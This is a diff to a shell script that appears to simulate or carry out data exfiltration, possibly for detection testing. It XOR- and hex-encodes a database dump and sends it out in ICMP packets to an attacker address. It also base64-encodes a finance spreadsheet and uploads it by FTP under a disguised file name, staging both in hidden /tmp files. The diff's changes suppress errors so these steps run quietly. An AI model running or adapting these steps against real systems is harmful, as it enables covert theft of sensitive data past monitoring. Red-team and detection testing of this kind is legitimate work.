@@ -150,7 +150,8 @@ xor_file /var/backups/db.dump /tmp/.u4.xor "$ICMP_KEY"
 echo "  Hex encoding..."
 xxd -p /tmp/.u4.xor | tr -d '\n' > /tmp/.hex
 echo "  Sending ICMP packets..."
-SCAPY_SUPPRESS_LAYERS=mspac python3 "$ROOT/attacker/icmp_sender.py" --hex-file /tmp/.hex --dest "$ICMP_IP" --chunk-size 56 || true
+# SCAPY_SUPPRESS_LAYERS suppresses the mspac layer loading error on Python 3.4
+SCAPY_SUPPRESS_LAYERS=mspac python3 "$ROOT/attacker/icmp_sender.py" --hex-file /tmp/.hex --dest "$ICMP_IP" --chunk-size 56 2>/dev/null || true
 rm -f /tmp/.u4.xor
 echo "  [✓] ICMP exfiltration complete"
 benign
@@ -176,12 +177,15 @@ gzip -c /opt/finance/q3_forecast.xlsx >/tmp/.gz
 base64 -w0 /tmp/.gz >/tmp/.u5
 if command -v ftp >/dev/null; then
 echo "  Uploading via FTP..."
+# Use set +H to disable history expansion which can interfere with ! in passwords
+set +H
 ftp -inv "$FTP_IP" <<EOF || true
 user $FTP_USER $FTP_PASSWORD
 binary
 put /tmp/.u5 daily_metrics.dat
 bye
 EOF
+set -H 2>/dev/null || true
 echo "  [✓] FTP exfiltration complete"
 else
 echo "  [!] ftp command not found, skipping"
